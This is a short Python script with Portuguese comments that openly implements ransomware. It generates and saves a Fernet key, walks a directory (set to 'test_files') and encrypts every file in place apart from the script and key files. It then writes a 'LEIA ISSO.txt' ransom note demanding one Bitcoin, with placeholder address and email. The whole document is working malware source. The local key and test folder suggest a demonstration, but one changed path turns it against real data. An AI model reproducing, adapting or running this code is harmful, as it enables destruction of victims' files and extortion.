# To install the dependency, run: pip install cryptography
from cryptography.fernet import Fernet
import os

#1 Gerar uma chave e salvá-la em um arquivo

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as arquivo_chave:
        arquivo_chave.write(chave)
    return chave
#2 Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3 Função para criptografar arquivos em um diretório
def criptografar_arquivos(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)

#4 Encontrar e criptografar todos os arquivos em um diretório
def encontrar_arquivos(diretorio):
    listas = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            if nome != os.path.basename(__file__) and not nome.endswith(".key"):
                caminho_completo = os.path.join(raiz, nome)
                listas.append(caminho_completo)
    return listas

#5 Mensagem de resgate
def criar_mensagem_ressgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Para recuperá-los, envie 1 Bitcoin para o endereço abaixo:\n")
        f.write("[ENDEREÇO DE BITCOIN]\n")
        f.write("Após o pagamento, envie um e-mail para [SEU EMAIL] com o comprovante.\n")
        f.write("Você receberá a chave de descriptografia em resposta.\n")
    
#6 Execucão principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivos(arquivo, chave)
    criar_mensagem_ressgate()
    print("Ransonware executado! Arquivos criptografados.")

if __name__ == "__main__":
    main()
